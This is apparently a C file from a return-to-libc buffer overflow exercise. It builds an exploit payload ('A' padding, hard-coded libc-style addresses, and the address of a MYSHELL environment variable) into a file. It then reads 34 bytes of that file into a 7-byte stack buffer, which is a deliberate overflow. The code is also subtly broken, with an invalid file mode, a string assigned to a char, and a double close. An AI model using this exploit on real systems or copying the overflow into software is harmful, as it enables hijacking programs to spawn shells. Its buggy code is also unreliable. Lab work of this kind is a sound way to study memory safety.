/* vulnerable.c */
// 0x080484ab
#include <stdio.h>
#include <string.h>
void show_mem_rep(char *start, int n)  
{ 
//https://www.geeksforgeeks.org/little-and-big-endian-mystery/
    	int i;
	FILE *output = fopen("holdFile","rw+");
	FILE *input = fopen("badfile","w+");
	fprintf(output,"4141414141414141414141414141414141414141414141");
	fprintf(output,"30f4e5b7");
	fprintf(output,"b02fe5b7");
    	for (i = 0; i < n; i++) 
    		if(i>0){
			fprintf(output,"%.2x",start[i]-0xFFFFFF00);
		}
		else{
			fprintf(output,"%.2x", start[i]);
		}
    	printf("\n");
	fclose(output);
	FILE *fp = fopen("holdFile","r");
	char hold[3];
	hold[2]="\0";
	do{
		
		hold[0] = fgetc(fp);
		hold[1] = fgetc(fp);
		if(feof(fp))
			break;
		fprintf(input,"%c",(int)strtol(hold, NULL,16));
		//printf("\n");
	} while(1);
	printf("\n");
	//printf("%c",(int)strtol("30", NULL, 16));
	fclose(output);
	fclose(input);
} 
int main() {
	char buffer[7];
	//strcpy(buffer,argv[1]);
	unsigned char *shell = getenv("MYSHELL");
	if (shell){
		printf("%x\n", shell);
		
  		show_mem_rep((char *)&shell, sizeof(shell)); 
		
	}
	FILE *input = fopen("badfile", "r");
	fread(buffer, sizeof(char),34, input);
	printf("Read from file: %s\n", buffer);
	return 0;
}
